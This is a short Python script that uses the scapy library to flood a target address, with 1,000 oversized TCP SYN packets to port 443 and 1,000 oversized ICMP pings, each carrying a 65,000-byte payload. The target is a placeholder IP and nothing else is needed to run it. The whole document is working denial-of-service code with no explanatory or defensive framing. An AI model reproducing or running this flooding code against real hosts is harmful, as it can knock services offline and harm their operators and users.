from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort


def send_syn(target_ip_address: str, target_port: int, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
    ip = IP(dst=target_ip_address)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * size_of_packet)
    p = ip / tcp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_syn(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))


def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
    ip = IP(dst=target_ip_address)
    icmp = ICMP()
    raw = Raw(b"X" * size_of_packet)
    p = ip / icmp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)


ip = "X.X.X.X"
port = 443
send_syn(ip, port, number_of_packets_to_send=1000)
send_ping(ip, number_of_packets_to_send=1000)